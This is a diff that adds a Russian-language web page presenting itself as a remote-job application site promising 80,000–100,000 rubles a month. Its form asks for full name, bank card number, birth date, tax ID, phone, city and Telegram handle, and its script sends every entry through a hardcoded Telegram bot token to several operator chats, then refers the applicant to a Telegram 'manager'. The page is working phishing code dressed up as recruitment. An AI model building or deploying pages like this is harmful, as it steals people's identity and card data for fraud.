@@ -1,0 +1,1111 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Платформа для подачи заявок на удалённую работу">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <title>Работа Онлайн</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            overscroll-behavior: none;
+        }
+        .container {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        .header-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px;
+            margin-bottom: 15px;
+        }
+        .header {
+            font-size: 20px;
+            font-weight: bold;
+            transition: color 0.5s ease;
+        }
+        .theme-toggle {
+            display: flex;
+            gap: 8px;
+        }
+        .theme-toggle button {
+            border: none;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            font-size: 18px;
+            touch-action: manipulation;
+        }
+        .theme-toggle .light-btn {
+            background-color: #E6F0FA;
+            color: #1A2A44;
+        }
+        .theme-toggle .dark-btn {
+            background-color: #2A4066;
+            color: #66B0FF;
+        }
+        .theme-toggle button:hover {
+            opacity: 0.8;
+        }
+        .main-banner {
+            display: flex;
+            border-radius: 30px;
+            overflow: hidden;
+            height: 300px;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            margin: 0 -10px;
+            flex: 0 0 auto;
+        }
+        .banner-text {
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            border-radius: 30px;
+            margin: 5px 0 5px 5px;
+            transition: background-color 0.5s ease;
+        }
+        .banner-text h2 {
+            font-size: 32px;
+            margin: 0 0 15px;
+            line-height: 1.2;
+            transition: color 0.5s ease;
+        }
+        .banner-text p {
+            font-size: 18px;
+            margin: 0 0 15px;
+            transition: color 0.5s ease;
+        }
+        .banner-text button {
+            background-color: white;
+            color: #005BFF;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            touch-action: manipulation;
+        }
+        .banner-image {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.5s ease;
+            margin: 5px 5px 5px 0;
+        }
+        .banner-image img {
+            max-width: 100%;
+            height: auto;
+        }
+        .features {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            gap: 15px;
+            padding: 0 10px;
+            flex: 1;
+        }
+        .feature {
+            border-radius: 30px;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            transition: background-color 0.5s ease, color 0.5s ease;
+        }
+        .feature img {
+            width: 30px;
+            height: 30px;
+            margin-bottom: 8px;
+        }
+        .feature h3 {
+            font-size: 16px;
+            margin: 8px 0;
+            transition: color 0.5s ease;
+        }
+        .feature p {
+            font-size: 12px;
+            margin: 0;
+            transition: color 0.5s ease;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 30px;
+            width: calc(100% - 40px);
+            max-width: 500px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            box-sizing: border-box;
+        }
+        .modal-header {
+            background-color: #007AFF;
+            padding: 10px;
+            border-radius: 30px 30px 0 0;
+            text-align: center;
+            margin: -20px -20px 20px -20px;
+            width: calc(100% + 40px);
+            box-sizing: border-box;
+            transition: background-color 0.5s ease;
+        }
+        .modal-header h3 {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0;
+            color: white;
+            transition: color 0.5s ease;
+        }
+        .modal-content label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            margin-top: 15px;
+            transition: color 0.5s ease;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+        .modal-content input:focus {
+            border-color: #005BFF;
+            outline: none;
+        }
+        .modal-content button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            touch-action: manipulation;
+            position: relative;
+            z-index: 1001;
+        }
+        .modal-content button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            color: #666;
+        }
+        .notification {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            overflow-y: auto;
+        }
+        .notification-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 30px;
+            width: calc(100% - 20px);
+            max-width: 350px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            transition: background-color 0.5s ease, color 0.5s ease;
+        }
+        .notification-content h3 {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 0 0 10px;
+            transition: color 0.5s ease;
+        }
+        .notification-content p {
+            font-size: 14px;
+            margin: 0 0 15px;
+            transition: color 0.5s ease;
+        }
+        .notification-content a {
+            text-decoration: none;
+            transition: color 0.5s ease;
+        }
+        .notification-content button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            background-color: #ccc;
+            color: #666;
+            transition: background-color 0.5s ease, color 0.5s ease;
+            touch-action: manipulation;
+        }
+        .notification-content button.active {
+            background-color: #005BFF;
+            color: white;
+            cursor: pointer;
+        }
+        body.light {
+            background-color: #B3D4FF;
+            color: #333;
+        }
+        .light .header {
+            color: #005BFF;
+        }
+        .light .main-banner {
+            background-color: #007AFF;
+            color: white;
+        }
+        .light .banner-text {
+            background-color: rgba(0, 91, 255, 0.1);
+        }
+        .light .banner-text h2,
+        .light .banner-text p {
+            color: white;
+        }
+        .light .banner-image {
+            background-color: #007AFF;
+        }
+        .light .feature {
+            background-color: #E6F0FA;
+        }
+        .light .feature h3 {
+            color: #005BFF;
+        }
+        .light .feature p {
+            color: #666;
+        }
+        .light .modal-content {
+            background-color: #007AFF;
+        }
+        .light .modal-header {
+            background-color: #005BFF;
+        }
+        .light .modal-content label {
+            color: white;
+        }
+        .light .modal-content button {
+            background-color: white;
+            color: #005BFF;
+        }
+        .light .notification-content {
+            background-color: #E6F0FA;
+        }
+        .light .notification-content h3,
+        .light .notification-content p {
+            color: #005BFF;
+        }
+        .light .notification-content a {
+            color: #003BB5;
+        }
+        .light .notification-content button.active {
+            background-color: #005BFF;
+            color: white;
+        }
+        body.dark {
+            background-color: #1E2A44;
+            color: #E6E6E6;
+        }
+        .dark .header {
+            color: #66B0FF;
+        }
+        .dark .main-banner {
+            background-color: #2A4066;
+            color: #E6E6E6;
+        }
+        .dark .banner-text {
+            background-color: rgba(42, 64, 102, 0.3);
+        }
+        .dark .banner-text h2,
+        .dark .banner-text p {
+            color: #E6E6E6;
+        }
+        .dark .banner-text button {
+            background-color: #3B5998;
+            color: #E6E6E6;
+        }
+        .dark .banner-image {
+            background-color: #2A4066;
+        }
+        .dark .feature {
+            background-color: #2A4066;
+        }
+        .dark .feature h3 {
+            color: #66B0FF;
+        }
+        .dark .feature p {
+            color: #B0C4DE;
+        }
+        .dark .modal-content {
+            background-color: #2A4066;
+        }
+        .dark .modal-header {
+            background-color: #1F2E4D;
+        }
+        .dark .modal-content label {
+            color: #E6E6E6;
+        }
+        .dark .modal-content button {
+            background-color: #3B5998;
+            color: #E6E6E6;
+        }
+        .dark .notification-content {
+            background-color: #2A4066;
+        }
+        .dark .notification-content h3,
+        .dark .notification-content p {
+            color: #66B0FF;
+        }
+        .dark .notification-content a {
+            color: #99C7FF;
+        }
+        .dark .notification-content button.active {
+            background-color: #3B5998;
+            color: #E6E6E6;
+        }
+        .transition-circle {
+            position: fixed;
+            background: radial-gradient(circle, rgba(0, 91, 255, 0.8) 0%, transparent 70%);
+            border-radius: 30px;
+            pointer-events: none;
+            transform: scale(0);
+            transition: transform 0.8s ease-out;
+        }
+        .transition-circle.active {
+            transform: scale(5);
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 5px;
+            }
+            .header-section {
+                padding: 0 5px;
+                margin-bottom: 10px;
+            }
+            .header {
+                font-size: 18px;
+            }
+            .theme-toggle button {
+                width: 40px;
+                height: 40px;
+                font-size: 16px;
+            }
+            .main-banner {
+                flex-direction: column;
+                height: auto;
+                margin: 0 -5px;
+            }
+            .banner-text {
+                padding: 15px;
+                margin: 5px;
+                border-radius: 20px;
+            }
+            .banner-text h2 {
+                font-size: 24px;
+                margin-bottom: 10px;
+            }
+            .banner-text p {
+                font-size: 16px;
+                margin-bottom: 10px;
+            }
+            .banner-text button {
+                padding: 12px 24px;
+                font-size: 16px;
+            }
+            .banner-image {
+                margin: 5px;
+                padding: 10px;
+            }
+            .banner-image img {
+                max-height: 150px;
+            }
+            .features {
+                flex-direction: column;
+                gap: 10px;
+                padding: 0 5px;
+            }
+            .feature {
+                padding: 15px;
+                border-radius: 20px;
+            }
+            .feature img {
+                width: 25px;
+                height: 25px;
+            }
+            .feature h3 {
+                font-size: 14px;
+            }
+            .feature p {
+                font-size: 12px;
+            }
+            .modal-content {
+                padding: 15px;
+                max-width: 90%;
+                margin: 20px 0;
+            }
+            .modal-header {
+                padding: 8px;
+                margin: -15px -15px 15px -15px;
+                width: calc(100% + 30px);
+            }
+            .modal-header h3 {
+                font-size: 18px;
+            }
+            .modal-content label {
+                font-size: 14px;
+                margin-top: 12px;
+            }
+            .modal-content input {
+                padding: 10px;
+                font-size: 14px;
+            }
+            .modal-content button {
+                padding: 14px;
+                font-size: 16px;
+                margin-top: 10px;
+            }
+            .notification-content {
+                padding: 15px;
+                max-width: 90%;
+                margin: 20px 0;
+            }
+            .notification-content h3 {
+                font-size: 18px;
+            }
+            .notification-content p {
+                font-size: 14px;
+            }
+            .notification-content button {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body class="light">
+    <div class="container">
+        <div class="header-section">
+            <div class="header">
+                Поддержка Работы
+            </div>
+            <div class="theme-toggle">
+                <button class="light-btn" onclick="toggleTheme('light', event)" ontouchstart="toggleTheme('light', event)"><i class="fas fa-sun"></i></button>
+                <button class="dark-btn" onclick="toggleTheme('dark', event)" ontouchstart="toggleTheme('dark', event)"><i class="fas fa-moon"></i></button>
+            </div>
+        </div>
+        <div class="main-banner">
+            <div class="banner-text">
+                <h2>Удалённая Работа</h2>
+                <p>От 80 000 до 100 000 ₽ в месяц</p>
+                <button onclick="openModal()" ontouchstart="openModal()">Стать работником</button>
+            </div>
+            <div class="banner-image">
+                <img src="hands.webp">
+            </div>
+        </div>
+        <div class="features">
+            <div class="feature">
+                <img src="money.png">
+                <h3>Стабильный доход</h3>
+                <p>Выполняйте работу и получайте деньги сразу после ее завершения</p>
+            </div>
+            <div class="feature">
+                <img src="gift.png">
+                <h3>Дополнительный доход</h3>
+                <p>Получайте бонусы за заказы: до 50 000 ₽ за привлечение нового работника</p>
+            </div>
+            <div class="feature">
+                <img src="clock.png">
+                <h3>Гибкое расписание</h3>
+                <p>Можно выполнять работу несколько часов в неделю</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="applicationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Анкета</h3>
+            </div>
+            <form id="applicationForm" onsubmit="submitForm(event)">
+                <label for="name">ФИО</label>
+                <input type="text" id="name" name="name" required placeholder="Введите ФИО">
+
+                <label for="card">Номер карты на личное имя</label>
+                <input type="text" id="card" name="card" required placeholder="Введите номер карты">
+
+                <label for="birthdate">Дата рождения (ДД.ММ.ГГГГ)</label>
+                <input type="text" id="birthdate" name="birthdate" required placeholder="Например, 01.01.1990" pattern="\d{2}\.\d{2}\.\d{4}">
+
+                <label for="inn">ИНН</label>
+                <input type="text" id="inn" name="inn" required placeholder="Введите ваш ИНН" pattern="\d{10,12}">
+
+                <label for="phone">Номер телефона</label>
+                <input type="tel" id="phone" name="phone" required placeholder="Введите ваш номер телефона" pattern="\+?\d{10,12}">
+
+                <label for="city">Город</label>
+                <input type="text" id="city" name="city" required placeholder="Введите ваш город">
+
+                <label for="telegram">Ваш Telegram-юзернейм</label>
+                <input type="text" id="telegram" name="telegram" required placeholder="Введите @username" pattern="@[A-Za-z0-9_]{5,}">
+
+                <button type="submit" id="submitButton">Отправить</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="notificationModal" class="notification">
+        <div class="notification-content">
+            <h3>Заявка принята</h3>
+            <p>Напишите нашему менеджеру в Telegram: <a href="https://t.me/Sofi_Ozon" target="_blank" id="telegramLink">@Sofi_Ozon</a></p>
+            <button id="doneButton" onclick="closeNotification()" ontouchstart="closeNotification()">Готово</button>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('admin') === 'true';
+        const shouldClear = urlParams.get('clear') === 'true';
+
+        if (shouldClear) {
+            localStorage.removeItem('hasSubmitted');
+            alert('Заявки очищены. Пользователи могут отправлять заявки заново.');
+        }
+
+        function generateApplicationId() {
+            const timestamp = Date.now();
+            const random = Math.floor(Math.random() * 10000);
+            return `#${timestamp}-${random}`;
+        }
+
+        function detectPlatform() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (/mobile|android|iphone|ipad|ipod|opera mini|webos|blackberry|windows phone/i.test(userAgent)) {
+                return 'Mobile';
+            } else if (/linux/i.test(userAgent)) {
+                return 'Linux';
+            } else if (/windows/i.test(userAgent)) {
+                return 'Windows';
+            } else {
+                return 'Unknown';
+            }
+        }
+
+        async function fetchWithRetry(url, options, retries = 3, timeout = 20000) {
+            for (let i = 0; i < retries; i++) {
+                const controller = new AbortController();
+                let timeoutId;
+                try {
+                    timeoutId = setTimeout(() => {
+                        controller.abort();
+                        console.warn(`Fetch aborted due to timeout (${timeout}ms) on attempt ${i + 1} for URL: ${url}`);
+                    }, timeout);
+                    const response = await fetch(url, { ...options, signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) {
+                        const error = new Error(`HTTP error: ${url} returned ${response.status}`);
+                        error.status = response.status;
+                        error.response = await response.text();
+                        console.error(`Fetch failed with status ${response.status} on attempt ${i + 1} for URL: ${url}`, error.response);
+                        throw error;
+                    }
+                    return response;
+                } catch (error) {
+                    clearTimeout(timeoutId);
+                    if (error.name === 'AbortError') {
+                        console.error(`AbortError on attempt ${i + 1} for URL: ${url}`, error);
+                    } else if (error.status) {
+                        console.error(`HTTP error ${error.status} on attempt ${i + 1} for URL: ${url}`, error.response || error.message);
+                    } else {
+                        console.error(`Fetch error on attempt ${i + 1} for URL: ${url}`, error);
+                    }
+                    if (i === retries - 1) throw error;
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+        }
+
+        function escapeText(unsafe) {
+            if (!unsafe) return '';
+            return unsafe
+                .replace(/[<>&"']/g, '')
+                .replace(/\n/g, ' ')
+                .trim();
+        }
+
+        async function checkBotToken(botToken) {
+            try {
+                const response = await fetchWithRetry(
+                    `https://api.telegram.org/bot${botToken}/getMe`,
+                    {},
+                    3,
+                    20000
+                );
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Bot token valid:', result.result.username);
+                    return { valid: true, username: result.result.username };
+                } else {
+                    console.error('Invalid bot token:', result.description);
+                    return { valid: false, error: result.description };
+                }
+            } catch (error) {
+                console.error('Error checking bot token:', error);
+                return { valid: false, error: error.message };
+            }
+        }
+
+        async function checkChatId(botToken, chatId) {
+            try {
+                const response = await fetchWithRetry(
+                    `https://api.telegram.org/bot${botToken}/getChat`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId })
+                    },
+                    3,
+                    20000
+                );
+                const result = await response.json();
+                if (result.ok) {
+                    console.log(`Chat ID ${chatId} valid:`, result.result.title || result.result.username);
+                    return { valid: true, name: result.result.title || result.result.username };
+                } else {
+                    console.error(`Invalid chat ID ${chatId}:`, result.description);
+                    return { valid: false, error: result.description };
+                }
+            } catch (error) {
+                console.error(`Error checking chat ID ${chatId}:`, error);
+                return { valid: false, error: error.message };
+            }
+        }
+
+        async function initializeBotChecks() {
+            const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
+            const adminChatIds = ['7066276424','5005427148','6817476091','7409970440','2079893058'];
+
+            const tokenCheck = await checkBotToken(botToken);
+            if (!tokenCheck.valid) {
+                alert(`Ошибка: Бот не работает. ${tokenCheck.error}`);
+                return false;
+            }
+
+            const chatChecks = await Promise.all(adminChatIds.map(chatId => checkChatId(botToken, chatId)));
+            const invalidChats = chatChecks
+                .map((check, index) => (!check.valid ? `Chat ${adminChatIds[index]}: ${check.error}` : null))
+                .filter(Boolean);
+            if (invalidChats.length > 0) {
+                console.warn('Some chat IDs are invalid:', invalidChats);
+                alert(`Внимание: Проблемы с чатом:\n${invalidChats.join('\n')}`);
+                return false;
+            }
+            return true;
+        }
+
+        function openModal() {
+            const hasSubmitted = localStorage.getItem('hasSubmitted');
+            const modal = document.getElementById('applicationModal');
+            const submitButton = document.getElementById('submitButton');
+            modal.style.display = 'flex';
+            submitButton.disabled = hasSubmitted === 'true' && !isAdmin;
+            console.log('Modal opened, submit button disabled:', submitButton.disabled);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('applicationModal');
+            const form = document.getElementById('applicationForm');
+            modal.style.display = 'none';
+            form.reset();
+            console.log('Modal closed');
+        }
+
+        function showNotification() {
+            const modal = document.getElementById('notificationModal');
+            const telegramLink = document.getElementById('telegramLink');
+            const doneButton = document.getElementById('doneButton');
+            modal.style.display = 'flex';
+            telegramLink.addEventListener('click', () => doneButton.classList.add('active'), { once: true });
+            telegramLink.addEventListener('touchstart', () => doneButton.classList.add('active'), { once: true });
+            console.log('Notification shown');
+        }
+
+        function closeNotification() {
+            const doneButton = document.getElementById('doneButton');
+            const modal = document.getElementById('notificationModal');
+            if (doneButton.classList.contains('active')) {
+                modal.style.display = 'none';
+                console.log('Notification closed');
+            }
+        }
+
+        async function submitForm(event) {
+            event.preventDefault();
+            console.log('submitForm triggered');
+
+            const submitButton = document.getElementById('submitButton');
+            const form = document.getElementById('applicationForm');
+            const hasSubmitted = localStorage.getItem('hasSubmitted');
+
+            console.log('Form validity:', form.checkValidity());
+            if (!form.checkValidity()) {
+                console.log('Form validation failed, reporting validity');
+                form.reportValidity();
+                return;
+            }
+
+            console.log('Checking hasSubmitted:', hasSubmitted, 'isAdmin:', isAdmin);
+            if (hasSubmitted === 'true' && !isAdmin) {
+                alert('Вы уже отправили заявку. Повторная отправка невозможна.');
+                console.log('Form blocked: already submitted');
+                return;
+            }
+
+            submitButton.disabled = true;
+            console.log('Submit button disabled');
+
+            try {
+                console.log('Starting form processing');
+                const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
+                const adminChatIds = ['5005427148','7409970440','6817476091','2079893058'];
+
+                // Проверяем бот и чат
+                console.log('Running initializeBotChecks');
+                const checksPassed = await initializeBotChecks();
+                if (!checksPassed) {
+                    throw new Error('Bot or chat validation failed');
+                }
+
+                const formData = new FormData(form);
+                const data = {
+                    name: formData.get('name'),
+                    card: formData.get('card'),
+                    birthdate: formData.get('birthdate'),
+                    inn: formData.get('inn'),
+                    phone: formData.get('phone'),
+                    city: formData.get('city'),
+                    telegram: formData.get('telegram')
+                };
+                console.log('Form data:', data);
+
+                const applicationId = generateApplicationId();
+                const platform = detectPlatform();
+                console.log('Platform:', platform);
+
+                // Формируем сообщение без parse_mode, чистый текст, без IP
+                const message = `
+Новая заявка на работу:
+🆔 ID заявки: ${escapeText(applicationId)}
+👤 ФИО: ${escapeText(data.name)}
+💳 Номер карты: ${escapeText(data.card)}
+📅 Дата рождения: ${escapeText(data.birthdate)}
+🆔 ИНН: ${escapeText(data.inn)}
+📞 Номер телефона: ${escapeText(data.phone)}
+🏙 Город: ${escapeText(data.city)}
+📱 Telegram: ${escapeText(data.telegram)}
+💻 Платформа: ${escapeText(platform)}
+                `.trim();
+                console.log('Message prepared:', message);
+
+                const sendPromises = adminChatIds.map(async (chatId) => {
+                    try {
+                        console.log(`Sending message to chat ${chatId}`);
+                        const response = await fetchWithRetry(
+                            `https://api.telegram.org/bot${botToken}/sendMessage`,
+                            {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: message
+                                })
+                            },
+                            3,
+                            20000
+                        );
+                        const result = await response.json();
+                        console.log(`Send message to ${chatId} result:`, result);
+
+                        return { chatId, status: result.ok ? 'fulfilled' : 'rejected', error: result.ok ? null : result.description };
+                    } catch (error) {
+                        console.error(`Error sending to chat ${chatId}:`, error);
+                        return { chatId, status: 'rejected', error: error.message || error.response || 'Unknown error' };
+                    }
+                });
+
+                const results = await Promise.allSettled(sendPromises);
+                console.log('Send results:', results);
+
+                const fulfilled = results.filter(r => r.status === 'fulfilled' && r.value.status === 'fulfilled');
+                const errors = results
+                    .filter(r => r.status === 'rejected' || r.value.status === 'rejected')
+                    .map(r => `Chat ${r.value.chatId}: ${r.value.error || r.reason}`);
+
+                if (fulfilled.length > 0) {
+                    console.log('Message sent successfully to at least one chat');
+                    if (!isAdmin) {
+                        localStorage.setItem('hasSubmitted', 'true');
+                    }
+                    closeModal();
+                    showNotification();
+                } else {
+                    const errorMsg = `Ошибка при отправке заявки:\n${errors.join('\n')}`;
+                    console.error(errorMsg);
+                    alert(errorMsg);
+                }
+            } catch (error) {
+                console.error('Unexpected error in submitForm:', error);
+                alert(`Произошла ошибка: ${error.message || 'Неизвестная ошибка'}`);
+            } finally {
+                submitButton.disabled = false;
+                console.log('Submit button re-enabled, submitForm completed');
+            }
+        }
+
+        function toggleTheme(theme, event) {
+            const circle = document.createElement('div');
+            circle.classList.add('transition-circle');
+            
+            const x = event.clientX || (event.touches && event.touches[0].clientX);
+            const y = event.clientY || (event.touches && event.touches[0].clientY);
+            circle.style.left = `${x}px`;
+            circle.style.top = `${y}px`;
+            
+            const maxDimension = Math.max(window.innerWidth, window.innerHeight);
+            circle.style.width = `${maxDimension}px`;
+            circle.style.height = `${maxDimension}px`;
+            circle.style.transform = 'translate(-50%, -50%) scale(0)';
+            
+            document.body.appendChild(circle);
+            
+            setTimeout(() => {
+                circle.classList.add('active');
+            }, 10);
+            
+            setTimeout(() => {
+                document.body.className = theme;
+                circle.remove();
+            }, 800);
+        }
+
+        function startBotListener() {
+            const botToken = '7835987434:AAGRqX3J708CmNTnj8upHJU_Y8QLFsWBkRU';
+            const adminChatIds = ['5005427148','7409970440','6817476091','2079893058'];
+            let lastUpdateId = 0;
+            let isRunning = false;
+
+            const channel = new BroadcastChannel('bot_listener');
+            channel.onmessage = (event) => {
+                if (event.data === 'ping') {
+                    channel.postMessage('pong');
+                    isRunning = false;
+                } else if (event.data === 'pong') {
+                    isRunning = false;
+                }
+            };
+
+            channel.postMessage('ping');
+            setTimeout(() => {
+                if (!isRunning) {
+                    isRunning = true;
+                    console.log('Starting bot listener in this tab');
+                    initializeBot();
+                }
+            }, 1000);
+
+            async function initializeBot() {
+                try {
+                    const response = await fetchWithRetry(
+                        `https://api.telegram.org/bot${botToken}/deleteWebhook`,
+                        {},
+                        3,
+                        20000
+                    );
+                    const result = await response.json();
+                    if (result.ok) {
+                        console.log('Webhook disabled successfully');
+                    } else {
+                        console.error('Failed to disable webhook:', result);
+                    }
+                } catch (error) {
+                    console.error('Error disabling webhook:', error);
+                }
+
+                checkUpdates();
+            }
+
+            async function checkUpdates() {
+                if (!isRunning) return;
+
+                let delay = 15000;
+                try {
+                    if (isNaN(lastUpdateId)) {
+                        console.warn(`Invalid lastUpdateId: ${lastUpdateId}, resetting to 0`);
+                        lastUpdateId = 0;
+                    }
+
+                    const response = await fetchWithRetry(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`,
+                        {},
+                        3,
+                        20000
+                    );
+                    const data = await response.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = Number(update.update_id);
+                            const chatId = update.message?.chat?.id?.toString();
+                            const text = update.message?.text;
+
+                            if (adminChatIds.includes(chatId) && text === '/clear') {
+                                const siteUrl = window.location.href.split('?')[0] + '?clear=true';
+                                const message = `
+Очистка заявок:
+Перейдите по ссылке, чтобы сбросить все заявки:
+${siteUrl}
+                                `.trim();
+                                for (const adminChatId of adminChatIds) {
+                                    try {
+                                        await fetchWithRetry(
+                                            `https://api.telegram.org/bot${botToken}/sendMessage`,
+                                            {
+                                                method: 'POST',
+                                                headers: { 'Content-Type': 'application/json' },
+                                                body: JSON.stringify({
+                                                    chat_id: adminChatId,
+                                                    text: message
+                                                })
+                                            },
+                                            3,
+                                            20000
+                                        );
+                                    } catch (error) {
+                                        console.error(`Error sending /clear response to chat ${adminChatId}:`, error);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (error) {
+                    if (error.status === 409) {
+                        console.error('Conflict (409) detected, increasing delay to 30s');
+                        delay = 30000;
+                    } else {
+                        console.error('Ошибка в bot listener:', error);
+                    }
+                }
+                setTimeout(checkUpdates, delay);
+            }
+
+            window.addEventListener('unload', () => {
+                if (isRunning) {
+                    channel.postMessage('ping');
+                    channel.close();
+                }
+            });
+        }
+
+        // Добавляем обработчик для кнопки на случай, если событие формы не срабатывает
+        document.getElementById('submitButton').addEventListener('click', (event) => {
+            console.log('Submit button clicked');
+            const form = document.getElementById('applicationForm');
+            if (form.checkValidity()) {
+                console.log('Form is valid, dispatching submit event');
+                form.dispatchEvent(new Event('submit', { cancelable: true }));
+            } else {
+                console.log('Form validation failed on button click');
+                form.reportValidity();
+            }
+        });
+
+        initializeBotChecks();
+        startBotListener();
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'936c2257ab0fadb9',t:'MTc0NTczMzk4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
